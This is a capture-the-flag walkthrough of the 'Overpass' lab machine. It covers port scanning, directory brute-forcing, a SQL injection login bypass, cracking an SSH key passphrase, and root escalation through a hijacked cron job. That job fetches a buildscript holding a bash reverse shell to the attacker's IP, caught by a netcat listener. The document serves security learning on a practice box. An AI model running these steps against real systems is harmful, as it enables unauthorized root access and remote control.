# Overpass

## 1. Recon

### 1.1 Port Scanning
```
❯ nmap -sC -sV -A BOX_IP
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-02 22:56 EST
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 49.58% done; ETC: 22:56 (0:00:23 remaining)
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 66.33% done; ETC: 22:57 (0:00:20 remaining)
Nmap scan report for BOX_IP
Host is up (0.41s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.19 seconds
```

PS: you can run this with `--script=vuln`, and that works too. But, it took this amount of time:
`Nmap done: 1 IP address (1 host up) scanned in 1216.13 seconds`. So maybe not a good idea. 


### 1.2 Web Enumeration
```
❯ gobuster dir -u BOX_IP -w "/usr/share/wordlists/rockyou.txt" -x "html,php,txt"
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://BOX_IP
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2021/02/02 23:06:26 Starting gobuster
===============================================================
/index.html (Status: 301)
/img (Status: 301)
/downloads (Status: 301)
/aboutus (Status: 301)
/admin (Status: 301)
/admin.html (Status: 200)
/css (Status: 301)
Progress: 1322 / 220561 (0.60%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/02/02 23:12:32 Finished
===============================================================
```

### 1.3 SQLI
hmmm. admin look interesting. Using `/admin.html` gives us a login page.

lets try a basic sql injection: `69 OR 1=1`

...

works!

okay so name of the person is james and ... we have the ssh private key printed out lmao.

## 2. Foothold

 lets try:

`❯ ssh -i key james@BOX_IP`

- key: the rsa key
- james: the username
- BOX_IP: IP address of the box.

password protected ;-; ok so lets take that key and convert it into a better format.

`python ssh2john.py id_rsa > id_rsa.hash`

time to bruteforce!

```
❯ john hash -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
*******          (key)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:07 DONE (2021-02-02 23:49) 0.1385g/s 1986Kp/s 1986Kc/s 1986KC/sa6_123..*7¡Vamos!
Session completed
```
key hidden :)

```
❯ ssh -i key james@BOX_IP
Enter passphrase for key 'key': 
```
I'm in!

## 3. PrivEsc
```
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

ok so lets copy linpeas to find any issues:

`❯ scp -i path/to/key /path/to/linpeas.sh james@BOX_IP:/destination/path`


now, 
```
james@overpass-prod:~$ chmod +x linpeas.sh 
james@overpass-prod:~$ ./linpeas.sh 
```

hmm. so we have `/etc/hosts` available to edit
```
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.1.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

and since there's some talk about automated build scipts, we should go look at cron.
```
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

ah yeas. look at the last one. it runs every minute, as root. only if we could change the hosting location of `overpass.thm` ... oh wait


so lets edit `/etc/hosts`'s `overpass.thm` to our own ip, and setup a python server using:
```
❯ sudo python3 -m http.server 80
[sudo] password for tanishq: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

note the port 80 since that curl is going to look in the default port. Now, wherever you started this server, from this location onwards, we need to have this exact structure `/downloads/src/buildscript.sh`, so

- `❯ mkdir downloads`
- `❯ cd downloads`
- `❯ mkdir src`
- `❯ cd src`
- `❯ echo "bash -i >& /dev/tcp/MY_IP/4242 0>&1" > buildscript.sh`

this lets us pretend to be a server, serving that `buildscript.sh` file :)

we are telling the sever to send us a tcp connection to our own ip on the port `4242`.

Meanwhile, setup netcat using:

`❯ nc -nlvp 4242`

- -l: listen mode, for inbound connects
- -n: numeric-only IP addresses, no DNS
- -v: verbose [use twice to be more verbose]
- -p port: local port number

and we are all in!
